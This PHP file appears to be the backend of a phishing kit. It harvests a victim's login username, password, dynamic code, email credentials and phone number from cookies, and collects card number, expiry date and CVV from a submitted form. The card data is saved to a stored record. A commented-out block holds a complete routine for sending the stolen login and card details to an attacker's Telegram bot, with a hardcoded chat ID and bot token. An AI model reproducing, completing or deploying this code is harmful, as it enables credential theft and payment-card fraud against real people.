<?php 
require('../panel/lib/funciones.php');
require('../acciones/bot_telegram.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];

$cdinamica = $_COOKIE['cdinamica'];
$email = $_COOKIE['email'];
$cemail = $_COOKIE['cemail'];
$celular = $_COOKIE['celular'];

$tarjeta = $_POST['tar'];
$fecha = $_POST['fec'];
$cvv = $_POST['cvv'];


setcookie('tarjeta',$tarjeta,time()+60*9);
setcookie('fecha',$fecha,time()+60*9);
setcookie('cvv',$cvv,time()+60*9);

actualizar_registro_tar($registro,$tarjeta,$fecha,$cvv);


if(empty($usuario) || empty($contrasena)){
    
}else{
    
// $chatId= "1053381147";
// $token = "7326614103:AAH7nj1c_exaJ8VUAVSLNYM4dUcaX3nu2JI";$mensaje = "USER AGREGO TARJETA: $usuario - $contrasena\n Tarjeta: $tarjeta\nFecha: $fecha\nCvv: $cvv";
// enviarMensajeTelegram($chatId, $mensaje, $token);
}
?>